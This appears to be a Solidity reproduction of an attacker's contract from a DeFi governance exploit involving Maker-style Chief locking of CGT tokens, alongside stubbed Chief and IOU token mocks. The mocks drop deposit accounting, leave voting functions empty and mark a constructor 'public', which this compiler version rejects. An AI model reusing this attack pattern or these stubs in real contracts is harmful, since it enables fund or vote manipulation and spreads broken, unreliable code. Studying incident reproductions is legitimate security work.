pragma solidity ^0.8.24;

import "./Interfaces.sol";

// Contract used by the attacker to get outstanding CGT balance
// The contract is verified at https://etherscan.io/address/0x1e791527aea32cddbd7ceb7f04612db536816545#code
contract Action {
    IDSChief chief;

    address public pans; // the attacker named the deployer after pans

    // The attacker knew the Chief address in advance, we pass this as a constructor argument
    constructor(address _chief) {
        pans = msg.sender;
        chief = IDSChief(_chief);
    }

    modifier onlyPans() {
        require(pans == msg.sender, "not pans");
        _;
    }

    function cook(address _cgt, uint256 amount, uint256 wethMin, uint256 daiMin) external onlyPans {
        IERC20 cgt = IERC20(_cgt);
        cgt.transferFrom(msg.sender, address(this), amount);
        cgt.approve(address(chief), amount);

        chief.lock(amount);
    }
}

// Chief contract introduced by Maker:
// https://docs.makerdao.com/smart-contract-modules/governance-module/chief-detailed-documentation
// Reference code: https://github.com/dapphub/ds-chief/blob/master/src/chief.sol
contract Chief is IDSChief {
    IDSToken public GOV; // voting token that gets locked up
    IDSToken public IOU; // non-voting representation of a token, for e.g. secondary voting mechanisms
    address public hat; // the chieftain's hat

    uint256 public MAX_YAYS;

    event Etch(bytes32 indexed slate);
    // event lock(uint256 amount);

    // IOU constructed outside this contract reduces deployment costs significantly
    // lock/free/vote are quite sensitive to token invariants. Caution is advised.
    constructor(address GOV_, address IOU_, uint256 MAX_YAYS_) public {
        GOV = IDSToken(GOV_);
        IOU = IDSToken(IOU_);
        MAX_YAYS = MAX_YAYS_;
    }

    function lock(uint256 wad) public {
        GOV.pull(msg.sender, wad);
        IOU.mint(msg.sender, wad);
        // deposits[msg.sender] = add(deposits[msg.sender], wad);
        // addWeight(wad, votes[msg.sender]);
    }

    function vote(address[] memory yays) external returns (bytes32) {}
    function lift(address whom) external {}
    function free(uint256 wad) external {}
}

contract IOUToken {
    event Mint(address to, uint256 amount);

    function mint(address to, uint256 amount) external {
        emit Mint(to, amount);
    }
}
